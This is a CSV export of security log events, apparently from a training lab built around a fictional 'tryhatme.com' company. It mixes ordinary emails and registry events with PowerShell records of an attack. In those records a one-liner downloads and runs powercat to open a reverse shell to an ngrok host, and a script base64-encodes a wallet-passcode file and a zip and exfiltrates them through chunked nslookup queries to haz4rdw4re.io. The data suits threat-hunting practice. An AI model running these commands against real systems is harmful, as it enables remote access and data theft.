"_id","_ignored","_index","_score",attachment,content,datasource,direction,"dns.answers.data","dns.question.name","dns.resolved_ip","event.action","event.code","file.path","host.name",message,"network.protocol","powershell.command.invocation_details.value","powershell.command.name","powershell.file.script_block_text","process.command_line","process.name","process.parent.name","process.parent.pid","process.pid","process.working_directory",recipient,"registry.key","registry.path","registry.value",sender,subject,timestamp,"winlog.process.pid"
"WXV9ypsB8mE-0EyZMH8d","-",logs,"-",None," Here is a summary of our last discussion along with action items for the next steps Let us know if you have any modifications",email,outbound,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","duke@stylewatchjournal.com","-","-","-","roger.fedora@tryhatme.com","Follow-up on Previous Discussion: Next Steps for Engagement","Jan 17, 2026 @ 02:45:14.304","-"
"UnV8ypsB8mE-0EyZZX8D","-",logs,"-",None," Your feedback matters—take a few minutes to fill this out.",email,internal,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","michelle.smith@tryhatme.com","-","-","-","michelle.smith@tryhatme.com","Hat-titude Check: Employee Feedback Survey","Jan 17, 2026 @ 02:45:06.304","-"
"VXV8ypsB8mE-0EyZyn-f","-",logs,"-","-","-",sysmon,"-","-","-","-","Registry value set (rule: RegistryEvent)",13,"-","win-3456","-","-","-","-","-","-","-","-","-",3878,"-","-","System\CurrentControlSet\Enum\SWD\PRINTENUM\{49455221-FA52-47F9-826D-B41CFD35E447}\FriendlyName","HKLM\System\CurrentControlSet\Enum\SWD\PRINTENUM\{49455221-FA52-47F9-826D-B41CFD35E447}\FriendlyName",FriendlyName,"-","-","Jan 17, 2026 @ 02:44:49.304","-"
"U3V8ypsB8mE-0EyZm3_R","-",logs,"-","-","-",sysmon,"-","-","-","-","Registry value set (rule: RegistryEvent)",13,"-","win-3458","-","-","-","-","-","-","spoolsv.exe","-","-",3613,"-","-","System\CurrentControlSet\Control\DeviceClasses\{0ecef634-6ef0-472a-8085-5ad023ecbccd}\##?#SWD#PRINTENUM#{1E7F5481-8BCC-4426-B671-08BCD04848A0}#{0ecef634-6ef0-472a-8085-5ad023ecbccd}\#\Device Parameters\FriendlyName","HKLM\System\CurrentControlSet\Control\DeviceClasses\{0ecef634-6ef0-472a-8085-5ad023ecbccd}\##?#SWD#PRINTENUM#{1E7F5481-8BCC-4426-B671-08BCD04848A0}#{0ecef634-6ef0-472a-8085-5ad023ecbccd}\#\Device Parameters\FriendlyName",FriendlyName,"-","-","Jan 17, 2026 @ 02:44:37.304","-"
"UXV8ypsB8mE-0EyZZH_9","-",logs,"-","-","-",sysmon,"-","172.16.1.10","DC-01.tryhatme.com","172.16.1.10","Dns query (rule: DnsQuery)",22,"-","win-3453","-",dns,"-","-","-","-","OUTLOOK.EXE","-","-",3821,"-","-","-","-","-","-","-","Jan 17, 2026 @ 02:44:35.304","-"
"T3V7ypsB8mE-0EyZdn--","-",logs,"-","-","-",sysmon,"-","172.16.1.10","DC-01.tryhatme.com","172.16.1.10","Dns query (rule: DnsQuery)",22,"-","win-3455","-",dns,"-","-","-","-","OUTLOOK.EXE","-","-",3851,"-","-","-","-","-","-","-","Jan 17, 2026 @ 02:43:57.304","-"
"TnV7ypsB8mE-0EyZR3_1","-",logs,"-","-","-",sysmon,"-","-","-","-","Registry object added or deleted (rule: RegistryEvent)",12,"-","win-3453","-","-","-","-","-","-","spoolsv.exe","-","-",3888,"-","-","System\CurrentControlSet\Enum\SWD\PRINTENUM\{2D00BA8B-3E7F-4C85-88E7-D1E9D13350F0}\FriendlyName","HKLM\System\CurrentControlSet\Enum\SWD\PRINTENUM\{2D00BA8B-3E7F-4C85-88E7-D1E9D13350F0}\FriendlyName",FriendlyName,"-","-","Jan 17, 2026 @ 02:43:43.304","-"
"TXV7ypsB8mE-0EyZLH96","-",logs,"-",None," Interviews set for next week. Check your calendars for slots.",email,internal,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","safa.prince@tryhatme.com","-","-","-","safa.prince@tryhatme.com","Hiring Update - Interview Schedule","Jan 17, 2026 @ 02:43:39.304","-"
"UHV7ypsB8mE-0EyZln8T","-",logs,"-","-","-",sysmon,"-","-","-","-","Registry value set (rule: RegistryEvent)",13,"-","win-3451","-","-","-","-","-","-","spoolsv.exe","-","-",3623,"-","-","System\CurrentControlSet\Control\DeviceClasses\{0ecef634-6ef0-472a-8085-5ad023ecbccd}\##?#SWD#PRINTENUM#{49455221-FA52-47F9-826D-B41CFD35E447}#{0ecef634-6ef0-472a-8085-5ad023ecbccd}\#\Device Parameters\FriendlyName","HKLM\System\CurrentControlSet\Control\DeviceClasses\{0ecef634-6ef0-472a-8085-5ad023ecbccd}\##?#SWD#PRINTENUM#{49455221-FA52-47F9-826D-B41CFD35E447}#{0ecef634-6ef0-472a-8085-5ad023ecbccd}\#\Device Parameters\FriendlyName",FriendlyName,"-","-","Jan 17, 2026 @ 02:43:33.304","-"
"R3V6ypsB8mE-0EyZ-X_A","-",logs,"-","-","-",sysmon,"-","172.16.1.10","DC-01.tryhatme.com","172.16.1.10","Dns query (rule: DnsQuery)",22,"-","win-3457","-",dns,"-","-","-","-","OUTLOOK.EXE","-","-",3814,"-","-","-","-","-","-","-","Jan 17, 2026 @ 02:43:29.304","-"
"QnV6ypsB8mE-0EyZ2n-L","-",logs,"-","-","-",powershell,"-","-","-","-","Pipeline Execution Details","-","-","win-3450","Pipeline execution details for command line:     $FuncVars[""Process""] | Stop-Process. Context Information: 	DetailSequence=1	DetailTotal=1	SequenceNumber=5741	UserId=SSF\michael.ascot	HostName=ConsoleHost	HostVersion=5.1.20348.1366	HostId=bbaf2919-3765-42de-b254-1953f32951cb	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -c IEX(New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1'); powercat -c 2.tcp.ngrok.io -p 19282 -e powershell	EngineVersion=5.1.20348.1366	RunspaceId=b980ae09-17ad-4495-b218-4b1e52190205	PipelineId=1	ScriptName=	CommandLine=    $FuncVars[""Process""] | Stop-Process Details: CommandInvocation(Stop-Process): ""Stop-Process""ParameterBinding(Stop-Process): name=""InputObject""; value=""System.Diagnostics.Process (powershell)""","-","""Stop-Process"", ""System.Diagnostics.Process (powershell)""","-","-","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -c IEX(New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1'); powercat -c 2.tcp.ngrok.io -p 19282 -e powershell","-","-","-","-","-","-","-","-","-","-","-","Jan 17, 2026 @ 02:43:16.304","-"
"P3V6ypsB8mE-0EyZxn_p","-",logs,"-","-","-",powershell,"-","-","-","-","Pipeline Execution Details","-","-","win-3450","Pipeline execution details for command line: . Context Information: 	DetailSequence=1	DetailTotal=1	SequenceNumber=5745	UserId=SSF\michael.ascot	HostName=ConsoleHost	HostVersion=5.1.20348.1366	HostId=bbaf2919-3765-42de-b254-1953f32951cb	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -c IEX(New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1'); powercat -c 2.tcp.ngrok.io -p 19282 -e powershell	EngineVersion=5.1.20348.1366	RunspaceId=b980ae09-17ad-4495-b218-4b1e52190205	PipelineId=1	ScriptName=	CommandLine= Details: CommandInvocation(Out-Default): ""Out-Default""","-","""Out-Default""","-","-","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -c IEX(New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1'); powercat -c 2.tcp.ngrok.io -p 19282 -e powershell","-","-","-","-","-","-","-","-","-","-","-","Jan 17, 2026 @ 02:43:16.304","-"
"OHV6ypsB8mE-0EyZs39e","-",logs,"-","-","-",sysmon,"-","-","-","-","Process Create (rule: ProcessCreate)",1,"-","win-3450","-","-","-","-","-","""C:\Windows\system32\nslookup.exe"" RmYjEyNGZiMTY1NjZlfQ==.haz4rdw4re.io","nslookup.exe","powershell.exe",3728,3648,"C:\Users\michael.ascot\downloads\","-","-","-","-","-","-","Jan 17, 2026 @ 02:43:07.304","-"
"NHV6ypsB8mE-0EyZn3_T","-",logs,"-","-","-",powershell,"-","-","-","-","Pipeline Execution Details","-","-","win-3450","Pipeline execution details for command line: $base64 = [System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes(""C:\Users\michael.ascot\Downloads\BitcoinWalletPasscodes.txt"")); $base64 -split '(.{1,30})' | Where-Object { $_ -ne '' } | ForEach-Object {Invoke-Expression ""nslookup $_.haz4rdw4re.io""}. Context Information: 	DetailSequence=1	DetailTotal=1	SequenceNumber=483	UserId=SSF\michael.ascot	HostName=ConsoleHost	HostVersion=5.1.20348.1366	HostId=cc1a6844-a4f9-4e73-98b9-9193fdb89041	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -ExecutionPolicy Bypass	EngineVersion=5.1.20348.1366	RunspaceId=3c649a28-fde1-4e53-936b-e9e725bd8280	PipelineId=59	ScriptName=	CommandLine=$base64 = [System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes(""C:\Users\michael.ascot\Downloads\BitcoinWalletPasscodes.txt"")); $base64 -split '(.{1,30})' | Where-Object { $_ -ne '' } | ForEach-Object {Invoke-Expression ""nslookup $_.haz4rdw4re.io""} Details: CommandInvocation(Invoke-Expression): ""Invoke-Expression""ParameterBinding(Invoke-Expression): name=""Command""; value=""nslookup VEhNezE0OTczMjFmNGY2ZjA1OWE1Mm.haz4rdw4re.io""","-","""Invoke-Expression"", ""nslookup VEhNezE0OTczMjFmNGY2ZjA1OWE1Mm.haz4rdw4re.io""","-","-","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -ExecutionPolicy Bypass","-","-","-","-","-","-","-","-","-","-","-","Jan 17, 2026 @ 02:43:07.304","-"
"N3V6ypsB8mE-0EyZr3-B","-",logs,"-","-","-",sysmon,"-","-","-","-","Process Create (rule: ProcessCreate)",1,"-","win-3450","-","-","-","-","-","""C:\Windows\system32\nslookup.exe"" VEhNezE0OTczMjFmNGY2ZjA1OWE1Mm.haz4rdw4re.io","nslookup.exe","powershell.exe",3728,3700,"C:\Users\michael.ascot\downloads\","-","-","-","-","-","-","Jan 17, 2026 @ 02:43:07.304","-"
"RnV6ypsB8mE-0EyZ-X-1","-",logs,"-","-","-",powershell,"-","-","-","-","Pipeline Execution Details","-","-","win-3450","Pipeline execution details for command line: $base64 = [System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes(""C:\Users\michael.ascot\Downloads\BitcoinWalletPasscodes.txt"")); $base64 -split '(.{1,30})' | Where-Object { $_ -ne '' } | ForEach-Object {Invoke-Expression ""nslookup $_.haz4rdw4re.io""}. Context Information: 	DetailSequence=1	DetailTotal=1	SequenceNumber=485	UserId=SSF\michael.ascot	HostName=ConsoleHost	HostVersion=5.1.20348.1366	HostId=cc1a6844-a4f9-4e73-98b9-9193fdb89041	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -ExecutionPolicy Bypass	EngineVersion=5.1.20348.1366	RunspaceId=3c649a28-fde1-4e53-936b-e9e725bd8280	PipelineId=59	ScriptName=	CommandLine=$base64 = [System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes(""C:\Users\michael.ascot\Downloads\BitcoinWalletPasscodes.txt"")); $base64 -split '(.{1,30})' | Where-Object { $_ -ne '' } | ForEach-Object {Invoke-Expression ""nslookup $_.haz4rdw4re.io""} Details: CommandInvocation(Invoke-Expression): ""Invoke-Expression""ParameterBinding(Invoke-Expression): name=""Command""; value=""nslookup RmYjEyNGZiMTY1NjZlfQ==.haz4rdw4re.io""","-","""Invoke-Expression"", ""nslookup RmYjEyNGZiMTY1NjZlfQ==.haz4rdw4re.io""","-","-","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -ExecutionPolicy Bypass","-","-","-","-","-","-","-","-","-","-","-","Jan 17, 2026 @ 02:43:07.304","-"
"SnV7ypsB8mE-0EyZAX-K","-",logs,"-","-","-",powershell,"-","-","-","-","Pipeline Execution Details","-","-","win-3450","Pipeline execution details for command line: $base64 = [System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes(""C:\Users\michael.ascot\Downloads\BitcoinWalletPasscodes.txt"")); $base64 -split '(.{1,30})' | Where-Object { $_ -ne '' } | ForEach-Object {Invoke-Expression ""nslookup $_.haz4rdw4re.io""}. Context Information: 	DetailSequence=1	DetailTotal=1	SequenceNumber=487	UserId=SSF\michael.ascot	HostName=ConsoleHost	HostVersion=5.1.20348.1366	HostId=cc1a6844-a4f9-4e73-98b9-9193fdb89041	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -ExecutionPolicy Bypass	EngineVersion=5.1.20348.1366	RunspaceId=3c649a28-fde1-4e53-936b-e9e725bd8280	PipelineId=59	ScriptName=	CommandLine=$base64 = [System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes(""C:\Users\michael.ascot\Downloads\BitcoinWalletPasscodes.txt"")); $base64 -split '(.{1,30})' | Where-Object { $_ -ne '' } | ForEach-Object {Invoke-Expression ""nslookup $_.haz4rdw4re.io""} Details: CommandInvocation(Where-Object): ""Where-Object""ParameterBinding(Where-Object): name=""FilterScript""; value="" $_ -ne '' ""CommandInvocation(ForEach-Object): ""ForEach-Object""ParameterBinding(ForEach-Object): name=""Process""; value=""Invoke-Expression ""nslookup $_.haz4rdw4re.io""""ParameterBinding(Where-Object): name=""InputObject""; value=""""ParameterBinding(Where-Object): name=""InputObject""; value=""VEhNezE0OTczMjFmNGY2ZjA1OWE1Mm""ParameterBinding(ForEach-Object): name=""InputObject""; value=""VEhNezE0OTczMjFmNGY2ZjA1OWE1Mm""ParameterBinding(Where-Object): name=""InputObject""; value=""""ParameterBinding(Where-Object): name=""InputObject""; value=""RmYjEyNGZiMTY1NjZlfQ==""ParameterBinding(ForEach-Object): name=""InputObject""; value=""RmYjEyNGZiMTY1NjZlfQ==""ParameterBinding(Where-Object): name=""InputObject""; value=""""","-","""Where-Object"", "" $_ -ne '' "", ""ForEach-Object"", ""Invoke-Expression ""nslookup $_.haz4rdw4re.io"""", """", ""VEhNezE0OTczMjFmNGY2ZjA1OWE1Mm"", ""VEhNezE0OTczMjFmNGY2ZjA1OWE1Mm"", """", ""RmYjEyNGZiMTY1NjZlfQ=="", ""RmYjEyNGZiMTY1NjZlfQ=="", """"","-","-","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -ExecutionPolicy Bypass","-","-","-","-","-","-","-","-","-","-","-","Jan 17, 2026 @ 02:43:07.304","-"
"THV7ypsB8mE-0EyZFX8j","-",logs,"-",None," I have checked my schedule and I will be attending Looking forward to meeting everyone and exchanging ideas",email,outbound,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","conor@yahoo.com","-","-","-","michael.ascot@tryhatme.com","RE: Invitation to a Business Networking Luncheon Next Week","Jan 17, 2026 @ 02:42:59.304","-"
"LXV6ypsB8mE-0EyZXX9t","-",logs,"-","-","-",powershell,"-","-","-","-","Pipeline Execution Details","-","-","win-3450","Pipeline execution details for command line: $base64 = [System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes(""C:\Users\michael.ascot\Downloads\exfiltration\exfilt8me.zip"")); $base64 -split '(.{1,30})' | Where-Object { $_ -ne '' } | ForEach-Object {Invoke-Expression ""nslookup $_.haz4rdw4re.io""}. Context Information: 	DetailSequence=1	DetailTotal=1	SequenceNumber=459	UserId=SSF\michael.ascot	HostName=ConsoleHost	HostVersion=5.1.20348.1366	HostId=cc1a6844-a4f9-4e73-98b9-9193fdb89041	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -ExecutionPolicy Bypass	EngineVersion=5.1.20348.1366	RunspaceId=3c649a28-fde1-4e53-936b-e9e725bd8280	PipelineId=53	ScriptName=	CommandLine=$base64 = [System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes(""C:\Users\michael.ascot\Downloads\exfiltration\exfilt8me.zip"")); $base64 -split '(.{1,30})' | Where-Object { $_ -ne '' } | ForEach-Object {Invoke-Expression ""nslookup $_.haz4rdw4re.io""} Details: CommandInvocation(Invoke-Expression): ""Invoke-Expression""ParameterBinding(Invoke-Expression): name=""Command""; value=""nslookup HhlO5R8AAAAdAAAAHQAAAAAAAAAAAA.haz4rdw4re.io""","-","""Invoke-Expression"", ""nslookup HhlO5R8AAAAdAAAAHQAAAAAAAAAAAA.haz4rdw4re.io""","-","-","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -ExecutionPolicy Bypass","-","-","-","-","-","-","-","-","-","-","-","Jan 17, 2026 @ 02:42:52.304","-"
"LnV6ypsB8mE-0EyZXX-A","-",logs,"-","-","-",powershell,"-","-","-","-","Pipeline Execution Details","-","-","win-3450","Pipeline execution details for command line: $base64 = [System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes(""C:\Users\michael.ascot\Downloads\exfiltration\exfilt8me.zip"")); $base64 -split '(.{1,30})' | Where-Object { $_ -ne '' } | ForEach-Object {Invoke-Expression ""nslookup $_.haz4rdw4re.io""}. Context Information: 	DetailSequence=1	DetailTotal=1	SequenceNumber=449	UserId=SSF\michael.ascot	HostName=ConsoleHost	HostVersion=5.1.20348.1366	HostId=cc1a6844-a4f9-4e73-98b9-9193fdb89041	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -ExecutionPolicy Bypass	EngineVersion=5.1.20348.1366	RunspaceId=3c649a28-fde1-4e53-936b-e9e725bd8280	PipelineId=53	ScriptName=	CommandLine=$base64 = [System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes(""C:\Users\michael.ascot\Downloads\exfiltration\exfilt8me.zip"")); $base64 -split '(.{1,30})' | Where-Object { $_ -ne '' } | ForEach-Object {Invoke-Expression ""nslookup $_.haz4rdw4re.io""} Details: CommandInvocation(Invoke-Expression): ""Invoke-Expression""ParameterBinding(Invoke-Expression): name=""Command""; value=""nslookup 8KKEotTs0rSSzJzM8zMjAy1isoKKkA.haz4rdw4re.io""","-","""Invoke-Expression"", ""nslookup 8KKEotTs0rSSzJzM8zMjAy1isoKKkA.haz4rdw4re.io""","-","-","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -ExecutionPolicy Bypass","-","-","-","-","-","-","-","-","-","-","-","Jan 17, 2026 @ 02:42:52.304","-"
"KnV6ypsB8mE-0EyZTn8K","-",logs,"-","-","-",powershell,"-","-","-","-","Pipeline Execution Details","-","-","win-3450","Pipeline execution details for command line: $base64 = [System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes(""C:\Users\michael.ascot\Downloads\exfiltration\exfilt8me.zip"")); $base64 -split '(.{1,30})' | Where-Object { $_ -ne '' } | ForEach-Object {Invoke-Expression ""nslookup $_.haz4rdw4re.io""}. Context Information: 	DetailSequence=1	DetailTotal=1	SequenceNumber=461	UserId=SSF\michael.ascot	HostName=ConsoleHost	HostVersion=5.1.20348.1366	HostId=cc1a6844-a4f9-4e73-98b9-9193fdb89041	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -ExecutionPolicy Bypass	EngineVersion=5.1.20348.1366	RunspaceId=3c649a28-fde1-4e53-936b-e9e725bd8280	PipelineId=53	ScriptName=	CommandLine=$base64 = [System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes(""C:\Users\michael.ascot\Downloads\exfiltration\exfilt8me.zip"")); $base64 -split '(.{1,30})' | Where-Object { $_ -ne '' } | ForEach-Object {Invoke-Expression ""nslookup $_.haz4rdw4re.io""} Details: CommandInvocation(Invoke-Expression): ""Invoke-Expression""ParameterBinding(Invoke-Expression): name=""Command""; value=""nslookup AAAABbAAAASW52ZXN0b3JQcmVzZW50.haz4rdw4re.io""","-","""Invoke-Expression"", ""nslookup AAAABbAAAASW52ZXN0b3JQcmVzZW50.haz4rdw4re.io""","-","-","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -ExecutionPolicy Bypass","-","-","-","-","-","-","-","-","-","-","-","Jan 17, 2026 @ 02:42:52.304","-"
"OnV6ypsB8mE-0EyZs3-F","-",logs,"-","-","-",powershell,"-","-","-","-","Pipeline Execution Details","-","-","win-3450","Pipeline execution details for command line: $base64 = [System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes(""C:\Users\michael.ascot\Downloads\exfiltration\exfilt8me.zip"")); $base64 -split '(.{1,30})' | Where-Object { $_ -ne '' } | ForEach-Object {Invoke-Expression ""nslookup $_.haz4rdw4re.io""}. Context Information: 	DetailSequence=1	DetailTotal=1	SequenceNumber=463	UserId=SSF\michael.ascot	HostName=ConsoleHost	HostVersion=5.1.20348.1366	HostId=cc1a6844-a4f9-4e73-98b9-9193fdb89041	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -ExecutionPolicy Bypass	EngineVersion=5.1.20348.1366	RunspaceId=3c649a28-fde1-4e53-936b-e9e725bd8280	PipelineId=53	ScriptName=	CommandLine=$base64 = [System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes(""C:\Users\michael.ascot\Downloads\exfiltration\exfilt8me.zip"")); $base64 -split '(.{1,30})' | Where-Object { $_ -ne '' } | ForEach-Object {Invoke-Expression ""nslookup $_.haz4rdw4re.io""} Details: CommandInvocation(Invoke-Expression): ""Invoke-Expression""ParameterBinding(Invoke-Expression): name=""Command""; value=""nslookup YXRpb24yMDIzLnBwdHhQSwUGAAAAAA.haz4rdw4re.io""","-","""Invoke-Expression"", ""nslookup YXRpb24yMDIzLnBwdHhQSwUGAAAAAA.haz4rdw4re.io""","-","-","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -ExecutionPolicy Bypass","-","-","-","-","-","-","-","-","-","-","-","Jan 17, 2026 @ 02:42:52.304","-"
